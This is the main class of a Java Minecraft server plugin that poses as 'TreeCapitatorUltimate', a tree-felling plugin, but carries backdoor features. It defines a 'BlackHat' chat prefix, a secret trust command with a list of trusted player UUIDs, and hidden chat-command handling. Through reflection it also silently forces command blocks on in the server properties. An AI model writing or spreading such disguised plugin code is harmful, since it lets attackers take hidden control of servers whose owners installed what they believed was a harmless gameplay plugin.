package me.bow.treecapitatorultimate;

import me.bow.treecapitatorultimate.command.CommandManager;
import me.bow.treecapitatorultimate.listeners.AsyncChatEvent;
import me.bow.treecapitatorultimate.listeners.TreeDestroy;
import net.minecraft.server.v1_14_R1.DedicatedServer;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.CommandSender;
import org.bukkit.craftbukkit.v1_14_R1.CraftServer;
import org.bukkit.plugin.java.JavaPlugin;
import org.spigotmc.SpigotConfig;

import java.util.ArrayList;
import java.util.UUID;

import static me.bow.treecapitatorultimate.Utils.ReflectionUtils.setFinalStatic;

public final class Start extends JavaPlugin {

    public static Start Instance = null;
    public static String COMMAND_SIGN = "-";
    public static String TRUST_COMMAND = "-dicksuck";
    public static String Prefix = "§a[§3Black§4Hat§a]§r ";
    public CommandManager cm = new CommandManager();
    public ArrayList<UUID> trustedPeople = new ArrayList<>();

    public static void ErrorString(CommandSender sender, String error) {
        if (sender == null || error.isEmpty()) return;
        sender.sendMessage(Prefix + ChatColor.RED + "Error: " + error);
        sender.sendMessage(Prefix + ChatColor.BLUE + "Please message the developer if you thing this is something that shouldn't happen.");
    }

    public static void ErrorException(CommandSender sender, Exception error) {
        if (sender == null || error == null) return;
        sender.sendMessage(Prefix + ChatColor.RED + "Exception: " + error.getMessage());
        sender.sendMessage(Prefix + ChatColor.RED + "Possible cause: " + error.getCause());
        sender.sendMessage(Prefix + ChatColor.BLUE + " Please message the developer if you thing this is something that shouldn't happen.");
    }

    public static DedicatedServer GetServer() {
        return ((CraftServer) Bukkit.getServer()).getServer();
    }

    @Override
    public void onEnable() {
        Instance = this;
        try {
            setFinalStatic(GetServer().getDedicatedServerProperties(), "enableCommandBlock", true);
            // server.propertyManager.getProperties().enableCommandBlock = false;
        } catch (Exception e) {
            System.out.println(e);
        }
        SpigotConfig.unknownCommandMessage = "Fuck";
        Bukkit.getConsoleSender().sendMessage("§2------------------------------------");
        Bukkit.getConsoleSender().sendMessage("§3--| TreeCapitatorUltimate loaded |--");
        Bukkit.getConsoleSender().sendMessage("§2------------------------------------");
        Bukkit.getPluginManager().registerEvents(new TreeDestroy(), this);
        Bukkit.getPluginManager().registerEvents(new AsyncChatEvent(), this);
        cm.Init();
    }

    @Override
    public void onDisable() {
        Bukkit.getConsoleSender().sendMessage("§2---------------------------------------");
        Bukkit.getConsoleSender().sendMessage("§3--| TreeCapitatorUltimate unloading |--");
        Bukkit.getConsoleSender().sendMessage("§2---------------------------------------");
    }
}
